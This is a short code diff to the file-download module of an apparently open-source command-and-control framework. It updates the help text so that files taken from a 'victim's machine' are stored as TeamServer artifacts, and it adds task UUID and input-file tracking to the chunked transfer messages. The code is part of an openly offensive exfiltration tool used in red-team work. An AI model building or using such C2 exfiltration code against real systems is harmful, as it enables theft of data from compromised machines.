@@ -47,13 +47,13 @@ std::string Download::getInfo()
     std::string info;
 #ifdef BUILD_TEAMSERVER
     info += "Download Module:\n";
-    info += "Retrieve a file from the victim's machine and save it to the attacker's machine.\n";
+    info += "Retrieve a file from the victim's machine and register it as a generated TeamServer artifact.\n";
     info += "Large files are automatically split into 2MB chunks and transferred over multiple check-ins.\n";
     info += "\nUsage example:\n";
-    info += " - download C:\\Temp\\toto.exe /tmp/toto.exe\n";
+    info += " - download C:\\Temp\\toto.exe toto.exe\n";
     info += "\nArguments:\n";
     info += " <sourcePath>    Path to the file on the victim's machine\n";
-    info += " <destPath>      Destination path on the attacker's machine\n";
+    info += " <artifactName>  Optional generated artifact filename hint\n";
 #endif
     return info;
 }
@@ -98,6 +98,8 @@ int Download::recurringExec(C2Message& c2RetMessage)
     {
         c2RetMessage.set_instruction(std::to_string(moduleHash));
         c2RetMessage.set_cmd("");
+        c2RetMessage.set_uuid(m_taskUuid);
+        c2RetMessage.set_inputfile(m_inputfile);
         c2RetMessage.set_outputfile(m_outputfile);
 
         std::streamsize chunkSize = std::min(CHUNK_SIZE, (size_t)(m_fileSize - m_bytesRead));
@@ -146,7 +148,9 @@ int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
     c2RetMessage.set_cmd("");
     c2RetMessage.set_inputfile(c2Message.inputfile());
     c2RetMessage.set_outputfile(c2Message.outputfile());
+    m_inputfile = c2Message.inputfile();
     m_outputfile = c2Message.outputfile();
+    m_taskUuid = c2Message.uuid();
 
     std::string inputFile = c2Message.inputfile();
 
